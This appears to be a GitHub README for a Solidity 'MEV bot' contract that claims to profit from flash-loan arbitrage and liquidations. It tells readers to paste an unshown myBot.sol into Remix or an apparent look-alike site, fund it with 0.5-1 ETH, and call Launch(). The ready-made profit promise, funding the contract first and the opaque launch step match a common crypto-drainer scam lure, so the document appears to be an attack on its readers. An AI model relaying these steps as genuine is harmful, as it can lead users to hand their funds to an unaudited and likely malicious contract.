
![B](https://i.postimg.cc/Vvxx2whh/20251219-1540-Banner-dla-Githab-simple-compose-01kcvddqxpfd3bgr4kkvnf0qm7.png)

  

## Executor (Aave/Balancer + Uniswap/Sushi)

Basically, contract for MEV: takes flash loans, runs arbitrage between DEXes, does liquidations. Everything is ready, deploy and use.

  

What it does:

  

**Essentially:** contract takes tokens on loan (flash loan), exchanges them for other tokens through DEX, then returns the loan + fee, extracting profit from price differences.

  

**Important:** the whole scheme is built so that **the entire process happens within one transaction of one contract** — from taking the loan to repayment and getting profit.

  

-  **Aave V3 flashLoanSimple**: takes flash loan and calls `executeOperation(...)` callback, where the strategy is executed.

-  **Balancer Vault flashLoan**: multi-asset flash loan and `receiveFlashLoan(...)` callback.

-  **DEX cycle (arbitrage)**: 2 swaps (Uniswap V3 ↔ SushiSwap V2) with `minOut` and `minProfit` checks.

-  **Liquidation (Aave V3)**: `liquidationCall(...)` with `minCollateralOut` check.

-  **Withdrawals**: `withdrawEth(...)`, `withdrawToken(...)` + emergency `emergencyTokenRecovery(...)`.

  
  
  

How to run:

  

Owner contract — you are the owner, call functions, it does flash loans and strategies in one transaction.

  

**Quick scheme:**

1. Create contract in Remix: https://remix.ethereum.org/ or https://portable-remixide.org

  

According to Screenshot:

- 1- Create .sol file and paste contract in editor field [myBot.sol](myBot.sol)

- 2- Compilation tab > version 0.8.20 > Compile button

- 3- Deploy tab > Select Executor contract > press Deploy Contract

![Contract creation instructions](https://i.ibb.co/HTRkw29n/instructions.png)

  

2. Top up contract balance (0.5-1 ETH)

  

3. Run `Launch()` — it takes loan and performs operations

  

4. If need to withdraw profit — press `withdrawEth()` or `withdrawToken()`

  

Simple start: `Launch()` — loan amount is calculated as contract_balance * 200.

  
  

-  **Aave flash loan**: `executeFlashLoanArbitrage(asset, amount, params)`

-  **Balancer flash loan**: `executeBalancerFlashLoan(tokens, amounts, userData)`

  

`params/userData` are encoded as:

  

-  `operationType`:

-  `1` — DEX cycle

-  `2` — liquidation

  

Data formats:

  

### DEX cycle (operationType = 1)

  

```solidity

(uint8 firstDex, address tokenIn, address tokenOut, uint24 uniFee, uint256 minOut1, uint256 minOut2, uint256 minProfit)

```

  

-  `firstDex`: `0` = UniswapV3→Sushi, `1` = Sushi→UniswapV3

-  `uniFee`: 500 / 3000 / 10000

-  `minOut1/minOut2`: slippage protection at each step

-  `minProfit`: minimum profit (otherwise transaction reverts)

  

### Liquidation (operationType = 2)

  

```solidity

(address user, address debtAsset, address collateralAsset, uint256 debtToCover, bool receiveAToken, uint256 minCollateralOut)

```

  

Important to know:

  

- Don't expect easy money. Everything depends on the market — gas, slippage, competition, positions.

  

About ETH:

  

0.5-1 ETH will last a long time — for gas, if need to handle ETH/WETH, and just in case.

  

Roughly about profit: depends on loan size and market situation. For arbitrage usually 0.01-0.1% of amount, for liquidations — percentage of position. With 100 ETH loan might get 0.01-0.1 ETH profit, but this is very approximate and without guarantees — market changes every second.

  

Good luck!

![Visitors](https://visitor-badge.laobi.icu/badge?page_id=README_EN_PAGE_ID)